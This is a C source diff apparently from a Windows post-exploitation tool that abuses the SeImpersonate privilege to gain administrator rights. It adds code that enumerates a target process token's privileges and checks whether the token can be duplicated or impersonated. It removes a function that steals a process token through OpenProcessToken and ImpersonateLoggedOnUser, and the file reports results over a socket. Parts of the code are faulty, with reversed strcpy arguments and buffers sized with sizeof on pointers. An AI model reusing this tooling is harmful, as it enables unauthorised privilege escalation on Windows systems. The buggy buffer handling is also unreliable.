@@ -4,7 +4,7 @@
 * Description: Uses the SEImpersonate Priveledge to act as an administrator. 
 */
 
-#include "spoofer.h"
+#include "token_info.h"
 #include "doexec.h"
 #include <sddl.h>
 #include <userenv.h>
@@ -15,6 +15,7 @@
 #include <string.h>
 #include <tlhelp32.h>
 #include <tchar.h>
+#include <aclapi.h>
 
 #define ERROR_NOT_ALL_ASSIGNED 1300L
 
@@ -29,6 +30,63 @@ int username(int sockfd){
     send(sockfd, name, sizeof(char) * strlen(name), 0);
     free(name);
     return 0;
+}
+
+char* GetTokenPrivilegesAsString(HANDLE hToken) {
+    DWORD dwSize = 0;
+    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
+
+    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
+    if (pTokenPrivileges == NULL) {
+        return NULL;
+    }
+
+    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
+        free(pTokenPrivileges);
+        return NULL;
+    }
+
+    // Estimate size for output string
+    size_t outputSize = 0;
+    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
+        DWORD dwNameSize = 0;
+        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
+        outputSize += dwNameSize + 50; // Add space for attributes and formatting
+    }
+
+    char* output = (char*)malloc(outputSize);
+    if (output == NULL) {
+        free(pTokenPrivileges);
+        return NULL;
+    }
+    
+    // Prepare the output string
+    char* current = output;
+    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
+        DWORD dwNameSize = 0;
+        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
+        char* privilegeName = (char*)malloc(dwNameSize);
+        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, privilegeName, &dwNameSize);
+
+        // Append privilege information to output string
+        int len = sprintf(current, "%s: %s\n", privilegeName,
+                          (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled");
+        current += len;
+
+        free(privilegeName);
+    }
+
+    free(pTokenPrivileges);
+    return output;
+}
+
+BOOL HasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
+    HANDLE hTokenDup;
+    if (DuplicateTokenEx(hToken, desiredAccess, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup)) {
+        CloseHandle(hTokenDup);
+        return TRUE;
+    }
+    return FALSE;
 }
 
 char *PrintUserInfoFromToken(DWORD processId) {
@@ -59,13 +117,18 @@ char *PrintUserInfoFromToken(DWORD processId) {
         return error;
     }
 
-    BOOL canImpersonate = FALSE;
-    char *impString;
-    if (GetTokenInformation(hToken, TokenType, &canImpersonate, sizeof(BOOL), &tokenInfoLength) &&
-        canImpersonate == TokenImpersonation) {
-        impString = "\r\n[+] You can impersonate with this token.\r\n";
-    } else {
-        impString = "\r\n[-] You cannot impersonate with this token.\r\n";
+    char* privilegesString = GetTokenPrivilegesAsString(hToken);
+    char* has_query = "\r\n[-] Token does not have query perms.";
+    char* has_duplicate = "\r\n[-] Token does not have duplicate perms.";
+    char* has_impersonate  = "\r\n[-] Token does not have impersonate perms.\r\n";
+    if (HasTokenPermission(hToken, TOKEN_QUERY)){
+        has_query = "\r\n[+] Token has query perms.";
+    }
+    if (HasTokenPermission(hToken, TOKEN_DUPLICATE)){
+        has_duplicate = "\r\n[+] Token has duplicate perms.";
+    }
+    if (HasTokenPermission(hToken, TOKEN_IMPERSONATE)){
+        has_impersonate  = "\r\n[+] Token has have impersonate perms.\r\n";
     }
 
 
@@ -89,12 +152,14 @@ char *PrintUserInfoFromToken(DWORD processId) {
         result = "ERROR: Process potentially terminated.";
     }
 
-    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(impString) + 2)*sizeof(char));
+    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(has_query) + strlen(has_duplicate) + strlen(has_impersonate) + 2)*sizeof(char));
     strcpy(result, banner);
     strcat(result, domainName);
     strcat(result, "\\");
     strcat(result, userName);
-    strcat(result, impString);
+    strcat(result, has_query);
+    strcat(result, has_duplicate);
+    strcat(result, has_impersonate);
 
     // Cleanup
     free(userName);
@@ -103,56 +168,6 @@ char *PrintUserInfoFromToken(DWORD processId) {
     CloseHandle(hToken);
     CloseHandle(hProcess);
     return result;
-}
-
-char *impersonate(int pid){
-    HANDLE currentTokenHandle = NULL;
-    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
-    int error= GetLastError();
-    char *ret_message;
-
-    char *open_proc;
-    if (error == 0) {
-        open_proc = "[+] OpenProcess() success!\r\n";
-    } else {
-        open_proc = "[-] OpenProccess() failed!\r\n";
-        ret_message = malloc(strlen(open_proc) * sizeof(char) + 2);
-        strcpy(open_proc, ret_message);
-        return ret_message;
-    }
-    
-    char *open_token;
-    BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &currentTokenHandle);
-    error = GetLastError();
-    if (error == 0){
-        open_token = "[+] OpenProcessToken() success!\r\n";
-    } else {
-        open_token = "[-] OpenProcessToken() failed!\r\n";
-        ret_message = malloc((sizeof(open_proc) + sizeof(open_token) + 2));
-        strcpy(ret_message, open_proc);
-        strcat(ret_message, open_token);
-        return ret_message;
-    }
-
-       if (!ImpersonateLoggedOnUser(currentTokenHandle)) {
-        char *errorMsg = "[-] Impersonation Failed.\r\n";
-        ret_message = malloc((sizeof(errorMsg) + sizeof(open_token) + sizeof(open_proc)) + 2);
-        strcpy(ret_message, open_proc);
-        strcat(ret_message, open_token);
-        strcat(ret_message, errorMsg);
-        return ret_message;
-    }
-    char *imp_result;
-    if (GetLastError() == 0){
-        imp_result = "[+] ImpersonatedLoggedOnUser() success!\r\n";
-    } else {
-        imp_result = "[-] ImpersonatedLoggedOnUser() Return Code: 1 \r\n";
-    }
-    ret_message = malloc(sizeof(open_proc) + sizeof(open_token) + sizeof(imp_result) + 2);
-    strcpy(ret_message, open_proc);
-    strcat(ret_message, open_token);
-    strcat(ret_message, imp_result);
-    return ret_message;
 }
 
 void PrintError(LPTSTR msg) {
